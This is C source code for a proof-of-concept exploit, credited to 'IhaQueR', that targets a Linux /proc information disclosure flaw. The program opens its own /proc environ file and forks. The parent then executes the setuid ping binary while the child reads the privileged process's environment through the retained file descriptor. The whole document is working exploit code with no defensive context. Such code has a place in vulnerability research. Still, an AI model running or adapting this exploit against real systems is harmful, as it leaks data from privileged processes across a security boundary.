/****************************************************************
*                                                               *
*       Linux /proc information disclosure PoC                  *
*       by IhaQueR                                              *
*                                                               *
****************************************************************/



#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>



static char buf[128];



void fatal(const char *msg)
{
    printf("\n");
    if (!errno) {
        fprintf(stderr, "FATAL: %s\n", msg);
    } else {
        perror(msg);
    }

    printf("\n");
    fflush(stdout);
    fflush(stderr);
    exit(129);
}


int main()
{
    int fd, r;
    char c;

    sprintf(buf, "/proc/%d/environ", getpid());
    fd = open(buf, O_RDONLY);
    if (fd > 0) {
        sprintf(buf, "/proc/%d", getpid());
        if (fork()) {
            printf("\nparent executing setuid\n");
            fflush(stdout);
            execl("/bin/ping", "ping", "-c", "3", "127.0.0.1", NULL);
            fatal("execl");
        } else {
            sleep(1);
            printf("\nchild reads parent's proc:\n");
            fflush(stdout);
            while (1) {
                r = read(fd, &c, 1);
                if (r <= 0)
                    break;
                printf("%c", c);
            }
            printf("\n\nContent of %s\n", buf);
            fflush(stdout);
            execl("/bin/ls", "ls", "-l", buf, NULL);
        }
    } else
        fatal("open proc");

    printf("\n");
    fflush(stdout);

    return 0;
}
